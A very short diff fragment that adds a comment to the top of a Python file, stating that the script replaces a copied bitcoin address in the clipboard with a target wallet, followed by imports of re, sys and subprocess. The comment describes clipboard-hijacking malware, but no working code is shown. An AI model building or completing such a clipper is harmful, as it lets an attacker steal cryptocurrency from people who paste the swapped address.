@@ -1,3 +1,5 @@
+##Replace clipboard copy of bitcoin address with target bitcoin wallet.
+
 import re
 import sys
 import subprocess
